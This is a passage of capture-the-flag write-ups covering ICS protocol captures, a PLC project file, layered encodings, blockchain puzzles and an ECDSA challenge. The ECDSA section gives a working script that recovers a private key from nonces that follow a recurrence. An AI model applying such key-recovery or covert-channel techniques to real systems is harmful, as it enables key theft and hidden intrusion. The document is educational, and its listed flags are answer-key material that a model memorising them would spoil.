**A. Decoy (trap) in the OB1 block's comment/note**

If you open this file with plain `strings project.s7p` (the most
common tool for finding text in a binary file), you immediately find:

    REDLIMIT{db9_str1ng_1s_th3_d3c0y}

This string explicitly calls itself out as the "decoy" deliberately
placed as plain ASCII so `strings` finds it easily, so people think "oh
I found it" and stop looking.

**B. The real flag hidden in the recipe data block, `recipe_sig`
field**

This is the part that needs "suspicion" why? Because if you run
plain `strings` on the area around the `recipe_sig` field, the text
**won't show up**! Here's the proof (raw hex, right around the
`recipe_sig` field):

    0f b5 0a 72 65 63 69 70 65 5f 73 69 67 05 00 5a 00
    52 00 45 00 44 00 4c 00 49 00 4d 00 49 00 54 00 7b 00
    73 00 37 00 5f 00 64 00 34 00 74 00 34 00 62 00 6c 00
    30 00 63 00 6b 00 5f 00 31 00 6e 00 74 00 5f 00 ...

Notice: `72 65 63 69 70 65 5f 73 69 67` spells `"recipe_sig"` (the
field name, plain ASCII). But right after the field header
(`05 00` = type, `5a` = data length = 90 bytes), the data follows a
pattern of: **`00 XX 00 XX 00 XX ...`** a `0x00` byte tucked between
every character!

**Why does this defeat `strings`?** Because `strings` by default only
looks for plain ASCII text (1 byte per character, consecutive, no
`0x00` interleaved). Here, every character is written using **2 bytes
(UTF-16 big-endian)** so the letter `R` is written as `00 52` instead
of just `52`. This is a classic trick for hiding text from lazy string
search tools this technique is called **wide-string encoding** used
for obfuscation.

**Manual decode (take every `00 XX` pair, convert the second byte to
ASCII):**

    00 52 → R    00 45 → E    00 44 → D    00 4c → L    00 49 → I
    00 4d → M    00 49 → I    00 54 → T    00 7b → {    00 73 → s
    00 37 → 7    00 5f → _    00 64 → d    00 34 → 4    00 74 → t
    ... and so on until byte 00 7d → }

### Flag

    REDLIMIT{s7_d4t4bl0ck_1nt_4rr4y_symb0l_p4rs3}

### Why is this "plausible" as a real-world technique?

In real ICS/SCADA environments, PLC data blocks really can store array
data in various types (16-bit integers, strings, etc.). If an
insider/attacker wanted to smuggle secret data into a PLC project
without getting caught by a routine `strings` audit, storing it as a
16-bit integer array (which "happens" to become UTF-16 when read as
text) is a fairly realistic way to slip past a shallow check.

---

## Pattern summary (applies to both ICS/OT challenges above)

| Clue                                                                                                  | Meaning                                                                                                                       |
|-------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------|
| A command/field that **repeats with a regularly increasing/changing value** (IOA incrementing by 1 per command)      | Likely each "unit" of data stores one small chunk of a larger message (byte/character)                              |
| A string that's found very easily & **references itself** ("decoy", "not the real one")               | Be suspicious usually it's deliberately a bait                                                                                   |
| `0x00` bytes **interleaved** with other bytes that "look like ASCII"                                    | Try reading it as UTF-16 (LE or BE) instead of plain ASCII `strings -e l` (little-endian) or manual decode for big-endian |
| A field whose data length is "too large" for the expected type                                          | Actually inspect the contents it might not be a single value but a hidden array/string                                    |

WU-007 · 50 pts

# Gardu 104

ICS / OT

**Flag:** `REDLIMIT{i3c104_sc4l3d_s3tp01nt_c_se_nb_c0mm4nd}`

**File:** `gardu.iec104` (2422 bytes, a raw SCADA protocol capture)

### What IEC 104 is, briefly

This is the protocol used for communication between an operator
(control center) and equipment at a power substation (RTU/substation)
for example, to read sensors or send control commands. Each "packet"
is called an **APDU**, always starting with byte `0x68`, followed by 1
length byte, then the payload (**ASDU**).

Inside the ASDU there's a **TypeID** field that determines "what kind
of packet this is" for example: - TypeID `13` = a sensor data
(measurement) delivery - TypeID `49` (`0x31`) = a **set-point command**
from operator to device (change some value), type `C_SE_NB_1` (a
16-bit integer value)

### How I found the flag step by step

**Step 1 Parse all APDUs.** I scanned the file byte by byte, looking
for every `0x68`, reading the byte after it as the frame length, then
slicing out the frame. Found 135 frames total.

**Step 2 Filter down to the interesting ones.** Out of those 135
frames, I filtered for TypeID = `49` (set-point command) and COT
(Cause of Transmission) = `6` (meaning "activation" the operator is
actually sending a command, not just monitoring).

**Step 3 Look at the value pattern.** This is the key part. Each
command consists of: a destination address (IOA) + a **2-byte value**
being set. And those values, when converted to ASCII, turn out to spell
letters!

**Proof (raw hex, first 3 frames):**

    frame[3]: 68 10 02 00 00 00 31 01 06 00 0a 00 00 40 00 52 00 80
    frame[5]: 68 10 06 00 00 00 31 01 06 00 0a 00 01 40 00 45 00 80
    frame[8]: 68 10 0c 00 00 00 31 01 06 00 0a 00 02 40 00 44 00 80

The important part is the 2 bytes right before the final byte (`80`): -
frame[3] → `52 00` → decimal **82** → ASCII **`R`** - frame[5]
→ `45 00` → decimal **69** → ASCII **`E`** - frame[8] → `44 00`
→ decimal **68** → ASCII **`D`**

See where this is going? R-E-D... the start of `REDLIMIT`. Once all
~44 commands of this kind are ordered (the order is revealed by the
steadily increasing IOA: `00 40 00`, `01 40 00`, `02 40 00`, ...) and
each value is converted to a letter, the result spells a full sentence.

**Analogy:** imagine the operator "typing" the flag one letter per
command line, smuggling it through a command that's completely
legitimate at the protocol level (set-point commands are a normal part
of IEC104), except the values are deliberately chosen = the ASCII code
of each letter. This is called a **covert channel** hiding data
inside something "legitimate" that no one would suspect if they're just
checking normal functionality.

### Flag

    REDLIMIT{i3c104_sc4l3d_s3tp01nt_c_se_nb_c0mm4nd}

---

WU-008 · 50 pts

# Instalasi Air

ICS / OT

**Flag:** `REDLIMIT{m0dbus_fc16_r3g1st3r_byt3_0rd3r_r3c0n}`

**What was given?** A `.mbtcp` file a **Modbus/TCP** network capture,
the communication protocol used in industry (factories, hydro plants,
water treatment) to control machines/PLCs. The story: an attacker
smuggled data into "normal chatter" traffic between the operator
(SCADA) and the machine (PLC).

**What does that mean?** Modbus is like a simple chat protocol between
machines: it has a "write value X to slot Y" command. If an attacker
writes odd values into many slots in sequence, that can be a way to
hide a secret message similar to sending a message in Morse code
through a car's turn signal.

**Proof (PoC) the suspicious "write" commands I found** (Modbus
function `0x10` = "Write Multiple Registers", different from the
normal read command `0x03` that SCADA uses):

| Slot address | Raw data written |
|-------------|--------------------------|
| `0x100`     | `ERLDMITI`               |
| `0x104`     | `m{d0ub_s`               |
| `0x108`     | `cf61r_g3`               |
| `0x10c`     | `s13t_r`                 |
| `0x10f`     | `yb3t0_dr`               |
| `0x113`     | `r3r_c3n0`               |
| `0x117`     | `}`                      |

Joined in order, the result is scrambled: `ERLDMITIm{d0ub_scf61r_g3...`
not readable yet.

**The key:** every 2 characters are **swapped in position**
(byte-swapped) a classic mistake in industrial systems, where
"big-endian vs little-endian" byte order differs between devices
(similar to writing a date as `31/12` vs `12/31` both correct, just
in a different order). Example: `"ER"` swapped becomes `"RE"`, `"LD"`
swapped becomes `"DL"` → `ERLD` becomes `REDL`.

Once every pair is swapped and joined:

    REDLIMIT{m0dbus_fc16_r3g1st3r_byt3_0rd3r_r3c0n}

### ✅ Flag: `REDLIMIT{m0dbus_fc16_r3g1st3r_byt3_0rd3r_r3c0n}`

---

04 / CRYPTO

WU-009 · 50 pts

# Sandi Garuda

Crypto Hard

**Flag:** `REDLIMIT{r3kur3nsi_n0nc3_kuadr4t1k_di_4t4s_kurva_garuda}`

## Challenge Description

    Sandi Garuda System: the national signing HSM signs several official memos
    using ECDSA (secp256k1). For entropy efficiency, the HSM does not draw a
    genuinely fresh, random nonce every time. You are given a transcript of
    several signatures and a fragment of a secret word. Study how the HSM
    generates them, then break the key.

Files given: `chall.py` (the generator source) and `output.txt` (run
output: the curve, public key `Q`, 6 signature pairs, and an AES-GCM
flag ciphertext).

## 1. Source Analysis

The most important part of `chall.py` is how the nonce `k` is
generated:

``` python
c = int.from_bytes(os.urandom(32), "big") % N
k = int.from_bytes(os.urandom(32), "big") % N
...
for msg in MESSAGES:
    while True:
        R = ec_mul(k, G); r = R[0] % N; z = H(msg)
        if r != 0:
            s = (inv(k, N) * (z + r * d)) % N
            if s != 0: break
        k = (k * k + c) % N
    sigs.append((msg, r, s))
    k = (k * k + c) % N          # <-- nonce for the next round
```

`k` is **not** a fresh random nonce per message it's the result of a
quadratic recurrence:

$$k_{i+1} = k_i^2 + c \pmod n$$

with `c` constant (and secret) throughout the whole process. The
initial nonce `k_0` is also secret. This is a classic violation of the
ECDSA requirement: every nonce must be independent & random. Because
subsequent nonces are *deterministic* functions of the previous nonce
(via the fixed `c`), we can build an algebraic relation between
signatures to extract the private key `d`.

Once `d` is recovered, the flag is encrypted with:

``` python
key = hashlib.sha256(b"garuda-hsm-key||" + d.to_bytes(32, "big")).digest()
cipher = AES.new(key, AES.MODE_GCM, nonce=b"garuda-iv-01")
```

so once `d` is known, AES-GCM decryption is immediate.

## 2. Building the Mathematical Relation

From the standard ECDSA signing equation:

$$s_i \cdot k_i \equiv z_i + r_i \cdot d \pmod n$$

each nonce can be written **linearly** in terms of the private key `d`:

$$k_i = a_i + b_i \cdot d, \qquad a_i = z_i \cdot s_i^{-1} \bmod n,\\
\\ b_i = r_i \cdot s_i^{-1} \bmod n$$

Since `c` is constant at every recurrence step, for three consecutive
signatures $i, i{+}1, i{+}2$ the following holds:

$$k_{i+1} - k_i^2 = c = k_{i+2} - k_{i+1}^2 \pmod n$$

Substituting $k_i = a_i + b_i d$ into this equation yields **a single
quadratic equation in `d`** (since $k_i^2$ introduces a $d^2$ term):

$$(a_{i+1} - a_i^2) + (b_{i+1} - 2a_i b_i)\\d - b_i^2\\d^2 \\=\\
(a_{i+2} - a_{i+1}^2) + (b_{i+2} - 2a_{i+1} b_{i+1})\\d -
b_{i+1}^2\\d^2$$

All coefficients can be computed directly from the given data
(`r_i, s_i, z_i`). Since the curve order `n` (secp256k1) is **prime**,
the quadratic equation `A·d² + B·d + C ≡ 0 (mod n)` can be solved with
the quadratic formula using a modular square root (Tonelli–Shanks):

$$d = \frac{-B \pm \sqrt{B^2 - 4AC} \bmod n}{2A} \bmod n$$

This yields (at most) 2 candidate values for `d`. The correct candidate
is verified by checking $d \cdot G \stackrel{?}{=} Q$ (the public key
given in `output.txt`).

## 3. Proof of Concept (Solve Script)

``` python
#!/usr/bin/env python3
import hashlib
import sympy
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ---- secp256k1 curve parameters ----
P  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
N  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8

def inv(a, m): return pow(a, -1, m)

def ec_add(A, B):
    if A is None: return B
    if B is None: return A
    x1, y1 = A; x2, y2 = B
    if x1 == x2 and (y1 + y2) % P == 0: return None
    m = (3*x1*x1) * inv(2*y1, P) % P if A == B else (y2-y1) * inv((x2-x1) % P, P) % P
    x3 = (m*m - x1 - x2) % P
    return (x3, (m*(x1-x3) - y1) % P)

def ec_mul(k, Pt):
    R = None
    while k:
        if k & 1: R = ec_add(R, Pt)
        Pt = ec_add(Pt, Pt); k >>= 1
    return R

G = (Gx, Gy)
def H(msg): return int.from_bytes(hashlib.sha256(msg).digest(), "big") % N

# ---- data from output.txt ----
Q = (13985740631445150908282103409624931946214541181127923398690562794836743616483,
     41321383050925624504591487003694903167451545873032808070662850472023741723882)

signatures = [
    (b'NOTA-DINAS/2026: distribusi kunci sesi antar-kementerian', 46752234261513192236545380823020101290759414097186611730532647124807219360018, 24685780213893309477579288960164871197895950235246616398062484333986099308339),
    (b'NOTA-DINAS/2026: rotasi sertifikat gerbang identitas nasional', 24860196877078012319222937633633835539629977286561966777009654354029925559878, 50884852546083740374029546391364116716523060662255318724118463180564393839912),
    (b'NOTA-DINAS/2026: pengesahan manifest firmware HSM Garuda', 93234099586464203218287468218981869172068073395356498491027333298698493997437, 106082075668013620494094122199844826893078136132910908766318376379741382072275),
    (b'NOTA-DINAS/2026: audit berkala modul tanda tangan pusat', 81392982404112786773520094157198450901171754615651917008599033390941499219583, 454564433788400623596136929012626278253051272737949142185161239532098665442),
    (b'NOTA-DINAS/2026: sinkronisasi waktu tepercaya wilayah barat', 99792122142768970933116264589141175304828500095546517569056953025932682139716, 108206432707793948995684089890963206851889876385789530874638240235445773888984),
    (b'NOTA-DINAS/2026: pencabutan token layanan pihak ketiga', 39183624655849147087337364005252505658477224339633872602999188818394959858938, 2450643005678137014932331421736277881634603695000815307558859517345227863397),
]

z = [H(m) for m, r, s in signatures]
r = [t[1] for t in signatures]
s = [t[2] for t in signatures]

# k_i = a_i + b_i*d
a = [z[i] * inv(s[i], N) % N for i in range(6)]
b = [r[i] * inv(s[i], N) % N for i in range(6)]

d = sympy.symbols('d')

def diff_eq(i):
    k0 = a[i]   + b[i]   * d
    k1 = a[i+1] + b[i+1] * d
    k2 = a[i+2] + b[i+2] * d
    # (k1 - k0^2) - (k2 - k1^2) = 0  (mod N)   <-- c is eliminated
    return sympy.expand((k1 - k0**2) - (k2 - k1**2))

poly = sympy.Poly(diff_eq(0), d)
A, B, C = [int(c) % N for c in poly.all_coeffs()]     # A*d^2 + B*d + C = 0 (mod N)

disc = (B*B - 4*A*C) % N
roots = sympy.sqrt_mod(disc, N, all_roots=True)
inv2A = inv(2*A, N)

for root in roots:
    d_cand = ((-B + root) * inv2A) % N
    if ec_mul(d_cand, G) == Q:                        # verify against the public key
        d_priv = d_cand
        break

print("private key d =", d_priv)

# ---- decrypt the flag ----
key   = hashlib.sha256(b"garuda-hsm-key||" + d_priv.to_bytes(32, "big")).digest()
nonce = bytes.fromhex("6761727564612d69762d3031")
ct    = bytes.fromhex("539fe0be0756851554da58701b6ffde991b82479fc54f3c871a0915424921e0c5f1ce14ff3af6728cffe542f66fbb18f51409cee706f8915")
tag   = bytes.fromhex("25f73ff544b224e4025715496add4583")

flag = AESGCM(key).decrypt(nonce, ct + tag, None)
print(flag.decode())
```

### Output when run

    private key d = 109923268815731126562074169284855939904621437966834660532775057567280443175155
    REDLIMIT{r3kur3nsi_n0nc3_kuadr4t1k_di_4t4s_kurva_garuda}

## 4. Attack Flow Summary

| Step | Action                                                                                                             |
|---------|------------------------------------------------------------------------------------------------------------------|
| 1       | Identify the bug: nonce `k` follows the recurrence `k_{i+1}=k_i²+c mod n`, not pure randomness                         |
| 2       | Express each nonce `k_i` as a linear function of the private key `d` via the signing equation `s·k=z+r·d`       |
| 3       | Eliminate the unknown constant `c` using 3 consecutive signatures → a single quadratic equation in `d` |
| 4       | Solve the quadratic mod `n` (prime) with a modular square root (Tonelli–Shanks) → at most 2 candidates for `d`      |
| 5       | Verify each candidate via `d·G = Q`                                                                               |
| 6       | Derive the AES key (`SHA256("garuda-hsm-key||"+d)`) and decrypt `flag_ct`/`flag_tag` with AES-GCM             |

**Flag: `REDLIMIT{r3kur3nsi_n0nc3_kuadr4t1k_di_4t4s_kurva_garuda}`**

## Mitigation Notes

ECDSA nonces must be genuinely random and independent for every
signature (RFC 6979 recommends a deterministic nonce derived from the
message hash + private key, rather than from the previous nonce). Any
recurrence that makes nonces algebraically dependent on each other —
however small opens a path to reconstructing the private key through
a system of equations like the one above.

WU-010 · 50 pts

# Overcooked

Crypto Medium

**Flag:** `REDLIMIT{n0_sCr1pt_n33d3d_no_41_sl0p_}`

**What was given?** A text file containing Base64, plus a hint: *"Our
chef cooked this message several times using a layered recipe... peel
each dish from the end to find the original flavor."*

**What does that mean?** Like challenge #1, this is a **multi-layer
encoding** problem the difference is that here the layers are
**different types**, not all Base64. Think of it like a gift wrapped in
a box, inside newspaper, inside a plastic bag each layer is a
different material and has to be opened one at a time, each in its own
way.

**Proof (PoC) the 4 layers I found, outermost to innermost:**

**Layer 1 (outermost): Base64.** After decoding, strange lines like
this appear:

    ----- .---- .---- ----- ----- .---- .---- .----

**Layer 2: Morse code for digits.** It turns out every group of 5
symbols (dot/dash) is **Morse code for a digit 0–9** (e.g. `-----` =
digit `0`, `.----` = digit `1`, etc. the classic Morse code used for
radio/telegraph). After translating every group into a digit, the
result is **only 0s and 1s** meaning this is actually **binary** data
(the most basic computer language) "disguised" with Morse code.

**Layer 3: Binary → Text.** Those 0/1 digits get grouped in sets of 8
(1 byte = 1 character), producing strange-looking text like this:

    ga eh eg fe fb ff fb gc `ab ``_ cg hd ``d ef ...

**Layer 4 (innermost): a secret digit code.** Notice only 10 distinct
letters appear: `_` `` ` `` `a` `b` `c` `d` `e` `f` `g` `h` exactly
10 characters, like digits 0–9! That's indeed the intent: `_`=0,
`` ` ``=1, `a`=2, `b`=3, ..., `h`=9. Each "word" (space-separated) is a
**decimal ASCII code** disguised this way.

Example: the word `ga` → `g`=8, `a`=2 → forms **"82"** → ASCII code 82
= letter **`R`**. The word `eh` → `e`=6,`h`=9 → **"69"** → letter
**`E`**. `eg` → **"68"** → **`D`**. And so on and indeed, continuing
this yields exactly **`R-E-D-L-I-M-I-T`**! ✔️

After translating every word:

    REDLIMIT{n0_sCr1pt_n33d3d_no_41_sl0p_}

### ✅ Flag: `REDLIMIT{n0_sCr1pt_n33d3d_no_41_sl0p_}`

---

WU-011 · 50 pts

# 4xJump Shell

Crypto

**Flag:** `REDLIMIT{jUmp_1nt0_th3_p0w3rsh3ll_w0rld}`

**What was given?** One long block of random-looking text, plus a
hint: *"Jump 4 times every day, and the shells grow stronger! only
strong shells can do it."*

**What does that mean?** This is a riddle-style hint. "Jump 4 times" =
**decode Base64 four times in a row**. Base64 is a way to turn data
into text that's safe to send over email/chat (e.g. `SGVsbG8=`
decodes to `Hello`). Here, the first decode's result is Base64 again,
decoding it again yields Base64 again, four layers deep hence the
challenge saying "shells grow stronger" (each layer adds a bit more
"strength"/obfuscation).

**Proof (PoC) what I saw at each layer:**

Layers 1–3 all resolve to more Base64 (contents don't matter), but
**layer 4** is different it's no longer Base64, but actual
**PowerShell** code:

``` powershell
"OhRVrEoiDgRL5IILBMbfIoGTbJ{TPjIAUCLmZ3pWZ_SB1rjn9Wtgf0gw_wMtZchDI3_7_fJp1O043wKm3ecroXsf2h3g3rDl1xlxw_Qrw7R0eMrkIlpkdyr}OSJoR"[2,5,8,11,14,17,...]-join""
```

This is a PowerShell **array indexing** trick: take characters from
that long string, but only at positions 2, 5, 8, 11, 14, ... (skip 3
each time, starting from index 2), then join them into a new string.
So that long string is "junk" that contains the flag itself, but
scrambled and only the characters at specific positions form the real
flag (the rest is a distraction).

**How I solved it:** I grabbed the characters at those indices using
Python and joined the results.

    Combined result of characters at positions 2,5,8,11,... :
    REDLIMIT{jUmp_1nt0_th3_p0w3rsh3ll_w0rld}

### ✅ Flag: `REDLIMIT{jUmp_1nt0_th3_p0w3rsh3ll_w0rld}`

---

05 / MISC · BLOCKCHAIN

WU-012 · 150 pts

# Geprek Chain

Misc / Blockchain Medium

**Flag:** `REDLIMIT{L4h_BL0CkCh4iN_Br0W_S1UU}`

**Category:** Blockchain / Crypto **Flag:**
`REDLIMIT{L4h_BL0CkCh4iN_Br0W_S1UU}`

---

## 1. Getting to know the challenge

We're given 3 files:

| File         | Contents                                              |
|--------------|-----------------------------------------------------|
| `README.md`  | Story & hints                                   |
| `explore.py` | A starter-kit script (incomplete, has TODO sections) |
| `chain.json` | A dump of 8 blockchain blocks (index 0–7)                  |

From `README.md`, there are 4 important clues:

1.  A valid blockchain is **consistent** check that all blocks are
    valid first.
2.  Each block's `data` field is **locked by something belonging to
    its neighbor**.
3.  We'll need **base64**, **XOR**, and **sha256**.
4.  **The genesis block (index 0) likes to joke around / is a trap** —
    don't trust it right away.

This is a typical pattern for blockchain CTF challenges: each block is
encrypted using the previous block's hash, so we have to walk **in
order from start to end**, "unlocking" each block using the key from
the block before it.

---

## 2. Understanding the structure of one block

Example of block index 1:

``` json
{
  "index": 1,
  "timestamp": 1735690200,
  "transactions": [...],
  "data": "UkXC4aY=",
  "previous_hash": "000086adef471d5d98577c934036971df6f64589d831965eb09fdb208e76be26",
  "nonce": 42379,
  "hash": "00002a515a58fcaa20c648489402991003859afd2e7bc118daa7e3f5cc8cc123"
}
```

Important fields: - **`data`** → the secret message in **base64**
form, but still **encrypted**. - **`previous_hash`** → the hash of the
previous block. This is the strong candidate for the **XOR key**
(matching clue #2: "locked by something belonging to its neighbor"). -
**`hash`** → this block's own hash, computed from the other fields
(except `hash` itself).

`explore.py` already tells us how the block hash is computed:

``` python
def block_hash(b):
    header = json.dumps({
        "index": b["index"],
        "timestamp": b["timestamp"],
        "transactions": b["transactions"],
        "data": b["data"],
        "previous_hash": b["previous_hash"],
        "nonce": b["nonce"],
    }, sort_keys=True, separators=(",", ":"))
    return sha256_hex(header)
```

And a TODO comment at the very bottom of the script gives a blunt
hint:

    Hint: base64_decode(data) XOR bytes.fromhex(previous_hash)
    Then combine the fragments in index order.
    Remember: the genesis (index 0) is a trap. :)

So the decryption formula is:

    plaintext_fragment = base64_decode(data)  XOR  bytes.fromhex(previous_hash)

---

## 3. (Optional but recommended) Validate the chain first

Before cracking the data open, make sure the chain really is valid —
so we can be confident no block was forged/reordered. Just run
`explore.py`:

``` bash
python3 explore.py chain.json
```

This checks, for each block: - Does the stored `hash` match a
recomputed `block_hash()`? - Does `hash` satisfy Proof-of-Work
(starts with `"0000"`)? - Does this block's `previous_hash` really
match the previous block's `hash` (is the chain properly linked)?

If everything passes → `[+] Valid!`, meaning the order of blocks index
0..7 really is correct and nothing was inserted/shuffled. This matters
because our flag fragments later need to be joined **in the correct
order**.

---

## 4. Try decrypting the genesis block (index 0) and see the trap

The genesis block is special: it **has no previous block**, so its
`previous_hash` field is just all zeros (a dummy value):

    "previous_hash": "0000000000000000000000000000000000000000000000000000000000000000"

If we XOR using this... the result is just `base64_decode(data)`
itself (XOR with a zero byte = no change). Let's just directly
base64-decode the genesis's `data`:

``` python
import base64
print(base64.b64decode("UkVETElNSVR7aW5pX3A0bHN1X2o0bmc0bl9wM3JjNHk0X2czbmVzaXN9"))
```

Result:

    REDLIMIT{ini_p4lsu_j4ng4n_p3rc4y4_g3nesis}

Translated: **"this is fake, don't trust the genesis"** 😂

This lines up exactly with clue #4 in the README: *"The first block
(genesis) likes to joke around. Don't be fooled easily."* So even
though the format looks exactly like `REDLIMIT{...}`, the content is
**not the real flag** just bait to make people stop here. The real
flag has to be assembled from blocks **index 1 through 7**.

---

## 5. Decrypt blocks 1–7 and assemble the fragments

Now apply the formula from step 2 to each block index 1..7:

``` python
import base64, json

chain = json.load(open("chain.json"))

flag = ""
for blk in chain[1:]:          # skip genesis (index 0)
    key  = bytes.fromhex(blk["previous_hash"])   # key: hash of the previous block
    data = base64.b64decode(blk["data"])         # base64 decode first
    plain = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
    flag += plain.decode()
    print(blk["index"], "->", plain)

print("\nFLAG:", flag)
```

Why `key[i % len(key)]`? Because the base64-decoded `data` is only a
few bytes long (5–7 bytes), while `previous_hash` (after hex-decoding)
is much longer. So we only really need the **first few bytes** of the
hash as needed no real looping happens (`% len(key)` here rarely
actually "wraps", since `data` is always shorter than the hash).

Running it, the output per block:

| Index | Fragment |
|-------|---------|
| 1     | `REDLI` |
| 2     | `MIT{L` |
| 3     | `4h_BL` |
| 4     | `0CkCh` |
| 5     | `4iN_B` |
| 6     | `r0W_S` |
| 7     | `1UU}`  |

---

## 6. Combine them in index order

Since the chain has already been validated as properly ordered (step
3), we can just concatenate directly from index 1 → 7:

    REDLI + MIT{L + 4h_BL + 0CkCh + 4iN_B + r0W_S + 1UU}

Final result:

    REDLIMIT{L4h_BL0CkCh4iN_Br0W_S1UU}

---

## 7. Final flag 🎉

    REDLIMIT{L4h_BL0CkCh4iN_Br0W_S1UU}

("*Lah, blockchain, bro, siuu*" matching the goofy theme of the
challenge 😄)

---

## Quick summary (if you just want to reproduce it)

1.  Load `chain.json`.
2.  (Optional) validate the chain using `block_hash()` from
    `explore.py` confirm it's ordered & consistent.
3.  **Ignore** the genesis block's (index 0) decryption result it's
    a trap/bait.
4.  For each block index 1–7:
    `fragment = base64_decode(data) XOR bytes.fromhex(previous_hash)`
5.  Concatenate all fragments in index order (1→7).
6.  Get the flag: `REDLIMIT{L4h_BL0CkCh4iN_Br0W_S1UU}`

### Lessons from this challenge

- Always be suspicious of data that reads "conveniently" clean right
  from the start it's often bait (the genesis here).
- Read comments/TODOs in starter code they often leak the algorithm.
- In blockchain-crypto challenges, look for relationships between
  blocks (`previous_hash`, `hash`) as the encryption key the pattern
  "each block is locked by the previous block" is a common one.

WU-013 · 300 pts

# Blockchain Rewardless

Misc / Blockchain Hard

**Flag:** `REDLIMIT{Min1ng_BL0cK_Pr00f_0f_Wo0rk_iS_Cr4ZzzY}`

**What was given?** A Python program (`challenge.py`) that asks us to
"mine" 8 mini blockchain blocks in sequence before handing over the
flag similar to how Bitcoin works (having to find a `nonce` value
that makes the hash result have many leading zero digits).

**What does that mean?** This is a "psychological trap" challenge: it
makes us **feel like we have to** write a fast miner, spin up every CPU
core, etc. but if you read the code carefully, **the flag has
absolutely nothing to do with the mining result!**

**Proof (PoC) the weak part of the code:**

``` python
GENESIS_HASH   = "53b520bb07a39f6a41e7c72c82bb8b75c430e46e8a48cd59189a00bba778d1db"
ENCRYPTED_FLAG = "a38e6b200b0ba2f864104c1c799a74a6a05c9305638e16425cd5679056f3b07a9efb5d071d2fb8f35c2f1128328e4a84"

def unlock_flag():
    key = hashlib.sha256(b"unlock:" + GENESIS_HASH.encode()).digest()
    data = bytes.fromhex(ENCRYPTED_FLAG)
    keystream = (key * ((len(data) // len(key)) + 1))[:len(data)]
    return bytes(a ^ b for a, b in zip(data, keystream)).decode()
```

Look closely: the `unlock_flag()` function only needs
**`GENESIS_HASH`** (already written plainly in the source code,
readable by anyone) to build the "key" that unlocks `ENCRYPTED_FLAG`
(also already written in the source code). **None of the mining
result's variables are used here at all** so we don't need to mine
anything, just copy those two lines and rerun the math ourselves on our
own computer, offline, without ever touching the server.

I ran the exact same logic (take `GENESIS_HASH` → SHA-256 hash → use
it as the "key" to XOR-unlock `ENCRYPTED_FLAG`), and the flag came out
immediately, without mining a single block.

### ✅ Flag: `REDLIMIT{Min1ng_BL0cK_Pr00f_0f_Wo0rk_iS_Cr4ZzzY}`

*(Note: the `README.txt` file also deliberately plants 2 fake/bait
flags `REDLIMIT{SELAMAT_KAMU_HEBAT}` and an ASCII-art fragment
`lIMIT{bLOCKAIN_REWARDless}` those aren't the real flag, just traps.)*
